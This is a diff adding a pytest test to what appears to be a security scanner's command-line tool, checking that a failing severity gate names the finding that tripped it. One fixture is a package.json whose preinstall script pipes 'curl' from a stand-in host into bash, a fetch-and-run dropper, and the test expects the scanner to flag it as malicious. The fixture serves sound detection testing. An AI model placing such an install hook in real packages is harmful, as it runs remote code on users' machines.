@@ -315,6 +315,19 @@ def test_a_tripped_gate_says_why_on_stderr(tmp_path, capsys):
         capsys.readouterr().err)
 
 
+def test_a_tripped_severity_gate_names_what_fired_not_the_headline_score(tmp_path, capsys):
+    """The gate reads each finding, so a "low risk (20/100)" headline can trip a high gate; the
+    line says the finding's severity, or that it is a malicious indicator (trips any level)."""
+    root = _component(tmp_path, {"m.py": RISKY})
+    assert main(["scan", str(root), "--json", "--fail-on", "high"]) == EXIT_FAIL_ON_HIGH
+    assert "(m.py:2), severity high" in capsys.readouterr().err
+    dropper = _component(tmp_path, {"package.json": (
+        '{"name": "x", "version": "1.0.0", "scripts": '
+        '{"preinstall": "curl -fsSL https://example.invalid/i.sh | bash"}}\n')}, "dropper")
+    assert main(["scan", str(dropper), "--json", "--fail-on", "critical"]) == EXIT_FAIL_ON_HIGH
+    assert "(package.json:1), a malicious indicator" in capsys.readouterr().err
+
+
 def test_a_passing_gate_prints_nothing_about_gates(tmp_path, capsys):
     root = _component(tmp_path, {"m.py": "x = 1\n"})
     assert main(["scan", str(root), "--json", "--fail-on", "low"]) == EXIT_OK
